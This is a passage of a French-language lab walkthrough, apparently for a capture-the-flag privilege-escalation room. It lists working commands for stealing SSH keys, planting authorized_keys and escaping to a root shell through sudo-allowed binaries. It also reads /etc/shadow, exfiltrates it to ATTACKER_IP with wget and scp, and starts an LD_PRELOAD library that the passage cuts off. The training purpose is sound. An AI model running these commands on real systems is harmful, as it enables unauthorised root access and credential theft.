<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> ~/.ssh/</span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /root/.ssh/</span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /home/<span class="pp">*</span>/.ssh/</span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Chercher des clés SSH lisibles</span></span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> id_rsa <span class="dv">2</span><span class="op">&gt;</span>/dev/null <span class="at">-exec</span> ls <span class="at">-la</span> {} <span class="dt">\;</span></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Si une clé root est trouvée et lisible</span></span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/user/.ssh/id_rsa  <span class="co"># ou autre chemin</span></span>
<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Copier la clé sur votre machine</span></span>
<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur la machine cible:</span></span>
<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/user/.ssh/id_rsa</span>
<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur votre AttackBox:</span></span>
<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> root_key</span>
<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a><span class="co"># Coller la clé</span></span>
<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 600 root_key</span>
<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Se connecter avec la clé</span></span>
<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> root_key root@MACHINE_IP</span>
<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 2 : Ajouter votre propre clé</span></span>
<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Si /root/.ssh/authorized_keys est modifiable</span></span>
<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a><span class="co"># Générer une paire de clés sur votre machine</span></span>
<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh-keygen</span> <span class="at">-f</span> mykey</span>
<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Ajouter votre clé publique</span></span>
<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;VOTRE_CLE_PUBLIQUE&quot;</span> <span class="op">&gt;&gt;</span> /root/.ssh/authorized_keys</span>
<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Se connecter</span></span>
<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> mykey root@MACHINE_IP</span>
<span id="cb13-39"><a href="#cb13-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-40"><a href="#cb13-40" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Lire le flag</span></span>
<span id="cb13-41"><a href="#cb13-41" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="chemins-communs-pour-les-clés-ssh"> Chemins communs pour les
clés SSH</h3>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Clés privées</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/id_rsa</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/id_dsa</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/id_ecdsa</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/id_ed25519</span></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ex">/root/.ssh/id_rsa</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="ex">/home/*/.ssh/id_rsa</span></span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Clés publiques autorisées</span></span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/authorized_keys</span></span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="ex">/root/.ssh/authorized_keys</span></span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Fichiers de configuration</span></span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/config</span></span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/known_hosts</span></span></code></pre></div>
<h3 id="vérifier-les-permissions"> Vérifier les permissions</h3>
<div class="sourceCode" id="cb15"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Permissions correctes pour .ssh</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx------</span> <span class="er">(</span><span class="ex">700</span><span class="kw">)</span> <span class="ex">~/.ssh/</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Permissions correctes pour les clés</span></span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span> <span class="er">(</span><span class="ex">600</span><span class="kw">)</span> <span class="ex">id_rsa</span>       <span class="co"># Clé privée</span></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> <span class="er">(</span><span class="ex">644</span><span class="kw">)</span> <span class="ex">id_rsa.pub</span>   <span class="co"># Clé publique</span></span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> <span class="er">(</span><span class="ex">644</span><span class="kw">)</span> <span class="ex">authorized_keys</span></span></code></pre></div>
<h3 id="réponse-6"> Réponse</h3>
<p>Connexion réussie en tant que root via SSH</p>
<hr />
<h2
id="task-8---privilege-escalation---sudo-shell-escaping"><a name="task-8"></a>Task
8 - Privilege Escalation - Sudo (Shell Escaping)</h2>
<h3 id="objectif-7"> Objectif</h3>
<p>Exploiter les binaires autorisés en sudo pour obtenir un shell
root.</p>
<h3 id="commandes-7"> Commandes</h3>
<div class="sourceCode" id="cb16"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier les privilèges sudo</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-l</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple de sortie:</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="co"># User user may run the following commands on this host:</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="co">#     (root) NOPASSWD: /usr/bin/vim</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="co">#     (root) NOPASSWD: /usr/bin/find</span></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="co">#     (root) NOPASSWD: /usr/bin/nano</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="co">#     (root) NOPASSWD: /usr/bin/awk</span></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Utiliser GTFOBins pour trouver l&#39;exploit</span></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a><span class="co"># https://gtfobins.github.io/</span></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE VIM</span></span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> vim <span class="at">-c</span> <span class="st">&#39;:!/bin/bash&#39;</span></span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a><span class="co"># ou</span></span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> vim</span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Puis taper: :!/bin/bash</span></span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a><span class="co"># ou: :set shell=/bin/bash</span></span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a><span class="co">#     :shell</span></span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE FIND</span></span>
<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> find /home <span class="at">-exec</span> /bin/bash <span class="dt">\;</span></span>
<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a><span class="co"># ou</span></span>
<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> find . <span class="at">-exec</span> /bin/sh <span class="at">-i</span> <span class="dt">\;</span></span>
<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE AWK</span></span>
<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> awk <span class="st">&#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</span></span>
<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE NANO</span></span>
<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> nano</span>
<span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a><span class="co"># Ctrl+R Ctrl+X</span></span>
<span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a><span class="co"># reset; sh 1&gt;&amp;0 2&gt;&amp;0</span></span>
<span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE LESS</span></span>
<span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> less /etc/profile</span>
<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a><span class="co"># Puis taper: !/bin/bash</span></span>
<span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE MORE</span></span>
<span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> more /etc/profile</span>
<span id="cb16-41"><a href="#cb16-41" aria-hidden="true" tabindex="-1"></a><span class="co"># Puis taper: !/bin/bash</span></span>
<span id="cb16-42"><a href="#cb16-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-43"><a href="#cb16-43" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE MAN</span></span>
<span id="cb16-44"><a href="#cb16-44" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> man man</span>
<span id="cb16-45"><a href="#cb16-45" aria-hidden="true" tabindex="-1"></a><span class="co"># Puis taper: !/bin/bash</span></span>
<span id="cb16-46"><a href="#cb16-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-47"><a href="#cb16-47" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE VI</span></span>
<span id="cb16-48"><a href="#cb16-48" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> vi</span>
<span id="cb16-49"><a href="#cb16-49" aria-hidden="true" tabindex="-1"></a><span class="co"># :set shell=/bin/bash</span></span>
<span id="cb16-50"><a href="#cb16-50" aria-hidden="true" tabindex="-1"></a><span class="co"># :shell</span></span>
<span id="cb16-51"><a href="#cb16-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-52"><a href="#cb16-52" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE NMAP (versions anciennes)</span></span>
<span id="cb16-53"><a href="#cb16-53" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> nmap <span class="at">--interactive</span></span>
<span id="cb16-54"><a href="#cb16-54" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span><span class="op">&gt;</span> !sh</span>
<span id="cb16-55"><a href="#cb16-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-56"><a href="#cb16-56" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE PERL</span></span>
<span id="cb16-57"><a href="#cb16-57" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> perl <span class="at">-e</span> <span class="st">&#39;exec &quot;/bin/bash&quot;;&#39;</span></span>
<span id="cb16-58"><a href="#cb16-58" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-59"><a href="#cb16-59" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE PYTHON</span></span>
<span id="cb16-60"><a href="#cb16-60" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python <span class="at">-c</span> <span class="st">&#39;import os; os.system(&quot;/bin/bash&quot;)&#39;</span></span>
<span id="cb16-61"><a href="#cb16-61" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-62"><a href="#cb16-62" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE RUBY</span></span>
<span id="cb16-63"><a href="#cb16-63" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> ruby <span class="at">-e</span> <span class="st">&#39;exec &quot;/bin/bash&quot;&#39;</span></span>
<span id="cb16-64"><a href="#cb16-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-65"><a href="#cb16-65" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier que vous êtes root</span></span>
<span id="cb16-66"><a href="#cb16-66" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb16-67"><a href="#cb16-67" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb16-68"><a href="#cb16-68" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-69"><a href="#cb16-69" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Lire le flag</span></span>
<span id="cb16-70"><a href="#cb16-70" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="binaires-communs-exploitables"> Binaires communs
exploitables</h3>
<table>
<thead>
<tr class="header">
<th>Binaire</th>
<th>Commande d’exploitation</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>vim/vi</td>
<td><code>sudo vim -c ':!/bin/bash'</code></td>
</tr>
<tr class="even">
<td>nano</td>
<td>Ctrl+R Ctrl+X puis
<code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></td>
</tr>
<tr class="odd">
<td>less</td>
<td><code>sudo less /etc/profile</code> puis
<code>!/bin/bash</code></td>
</tr>
<tr class="even">
<td>more</td>
<td><code>sudo more /etc/profile</code> puis
<code>!/bin/bash</code></td>
</tr>
<tr class="odd">
<td>man</td>
<td><code>sudo man man</code> puis <code>!/bin/bash</code></td>
</tr>
<tr class="even">
<td>find</td>
<td><code>sudo find . -exec /bin/sh \;</code></td>
</tr>
<tr class="odd">
<td>awk</td>
<td><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></td>
</tr>
<tr class="even">
<td>perl</td>
<td><code>sudo perl -e 'exec "/bin/sh";'</code></td>
</tr>
<tr class="odd">
<td>python</td>
<td><code>sudo python -c 'import os; os.system("/bin/sh")'</code></td>
</tr>
<tr class="even">
<td>nmap</td>
<td><code>sudo nmap --interactive</code> puis <code>!sh</code></td>
</tr>
<tr class="odd">
<td>git</td>
<td><code>sudo git -p help</code> puis <code>!/bin/bash</code></td>
</tr>
</tbody>
</table>
<h3 id="réponse-7"> Réponse</h3>
<p>Shell root obtenu via escape de commande sudo</p>
<hr />
<h2
id="task-9---privilege-escalation---sudo-abusing-intended-functionality"><a name="task-9"></a>Task
9 - Privilege Escalation - Sudo (Abusing Intended Functionality)</h2>
<h3 id="objectif-8"> Objectif</h3>
<p>Abuser de la fonctionnalité intentionnelle d’un programme autorisé en
sudo.</p>
<h3 id="commandes-8"> Commandes</h3>
<div class="sourceCode" id="cb17"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier les privilèges sudo</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-l</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple: (root) NOPASSWD: /usr/bin/apache2</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE APACHE2</span></span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Apache2 peut lire n&#39;importe quel fichier</span></span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apache2 <span class="at">-f</span> /etc/shadow</span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Erreur affichée avec le contenu de /etc/shadow</span></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou créer un fichier de config malveillant</span></span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;LoadModule mpm_prefork_module /lib/x86_64-linux-gnu/libssl.so.1.0.0&#39;</span> <span class="op">&gt;</span> /tmp/exploit.conf</span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apache2 <span class="at">-f</span> /tmp/exploit.conf</span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE WGET</span></span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Si wget est autorisé en sudo</span></span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Utiliser wget pour lire des fichiers</span></span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> wget <span class="at">-i</span> /etc/shadow</span>
<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou exfiltrer des fichiers</span></span>
<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> wget <span class="at">--post-file</span><span class="op">=</span>/etc/shadow http://ATTACKER_IP:8000/</span>
<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE TAR</span></span>
<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a><span class="co"># Si tar est autorisé en sudo</span></span>
<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Créer une archive avec des fichiers sensibles</span></span>
<span id="cb17-26"><a href="#cb17-26" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> tar <span class="at">-cvf</span> /tmp/shadow.tar /etc/shadow</span>
<span id="cb17-27"><a href="#cb17-27" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> <span class="at">-xvf</span> /tmp/shadow.tar</span>
<span id="cb17-28"><a href="#cb17-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-29"><a href="#cb17-29" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou utiliser tar avec checkpoint pour exécuter des commandes</span></span>
<span id="cb17-30"><a href="#cb17-30" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;/bin/bash&quot;</span> <span class="op">&gt;</span> /tmp/shell.sh</span>
<span id="cb17-31"><a href="#cb17-31" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /tmp/shell.sh</span>
<span id="cb17-32"><a href="#cb17-32" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> tar <span class="at">-cf</span> /dev/null /dev/null <span class="at">--checkpoint</span><span class="op">=</span>1 <span class="at">--checkpoint-action</span><span class="op">=</span>exec=/tmp/shell.sh</span>
<span id="cb17-33"><a href="#cb17-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-34"><a href="#cb17-34" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE ZIP</span></span>
<span id="cb17-35"><a href="#cb17-35" aria-hidden="true" tabindex="-1"></a><span class="co"># Si zip est autorisé</span></span>
<span id="cb17-36"><a href="#cb17-36" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Zipper et lire des fichiers</span></span>
<span id="cb17-37"><a href="#cb17-37" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> zip /tmp/test.zip /etc/shadow</span>
<span id="cb17-38"><a href="#cb17-38" aria-hidden="true" tabindex="-1"></a><span class="fu">unzip</span> <span class="at">-p</span> /tmp/test.zip</span>
<span id="cb17-39"><a href="#cb17-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-40"><a href="#cb17-40" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE RSYNC</span></span>
<span id="cb17-41"><a href="#cb17-41" aria-hidden="true" tabindex="-1"></a><span class="co"># Si rsync est autorisé</span></span>
<span id="cb17-42"><a href="#cb17-42" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Utiliser rsync pour copier des fichiers</span></span>
<span id="cb17-43"><a href="#cb17-43" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> rsync <span class="at">-av</span> /root/ /tmp/root_backup/</span>
<span id="cb17-44"><a href="#cb17-44" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/root_backup/</span>
<span id="cb17-45"><a href="#cb17-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-46"><a href="#cb17-46" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE GIT</span></span>
<span id="cb17-47"><a href="#cb17-47" aria-hidden="true" tabindex="-1"></a><span class="co"># Si git est autorisé</span></span>
<span id="cb17-48"><a href="#cb17-48" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Git peut lire des fichiers</span></span>
<span id="cb17-49"><a href="#cb17-49" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> git diff /dev/null /etc/shadow</span>
<span id="cb17-50"><a href="#cb17-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-51"><a href="#cb17-51" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE SCP/SSH</span></span>
<span id="cb17-52"><a href="#cb17-52" aria-hidden="true" tabindex="-1"></a><span class="co"># Si scp est autorisé</span></span>
<span id="cb17-53"><a href="#cb17-53" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Copier des fichiers</span></span>
<span id="cb17-54"><a href="#cb17-54" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> scp /etc/shadow user@ATTACKER_IP:/tmp/</span>
<span id="cb17-55"><a href="#cb17-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-56"><a href="#cb17-56" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Lire le flag ou obtenir root</span></span>
<span id="cb17-57"><a href="#cb17-57" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="abus-de-fonctionnalités-courantes"> Abus de fonctionnalités
courantes</h3>
<p><strong>Apache2 :</strong> - Lit les fichiers de configuration (peut
lire n’importe quel fichier) - Affiche les erreurs avec le contenu</p>
<p><strong>Wget :</strong> - Peut lire des fichiers avec <code>-i</code>
- Peut exfiltrer avec <code>--post-file</code></p>
<p><strong>Tar :</strong> - Peut archiver n’importe quel fichier -
<code>--checkpoint-action</code> peut exécuter des commandes</p>
<p><strong>Zip :</strong> - Peut compresser n’importe quel fichier - Les
archives peuvent être lues</p>
<p><strong>Git :</strong> - <code>git diff</code> peut lire des fichiers
- <code>git help</code> peut spawner un shell</p>
<h3 id="réponse-8"> Réponse</h3>
<p>Accès aux fichiers sensibles ou shell root obtenu</p>
<hr />
<h2
id="task-10---privilege-escalation---sudo-ld_preload"><a name="task-10"></a>Task
10 - Privilege Escalation - Sudo (LD_PRELOAD)</h2>
<h3 id="objectif-9"> Objectif</h3>
<p>Exploiter la variable d’environnement LD_PRELOAD avec sudo.</p>
<h3 id="commandes-9"> Commandes</h3>
<div class="sourceCode" id="cb18"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier si LD_PRELOAD est préservé dans sudo</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-l</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Chercher la ligne: env_keep+=LD_PRELOAD</span></span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Créer une bibliothèque malveillante</span></span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /tmp/shell.c <span class="op">&lt;&lt; EOF</span></span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdio.h&gt;</span></span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;sys/types.h&gt;</span></span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdlib.h&gt;</span></span>
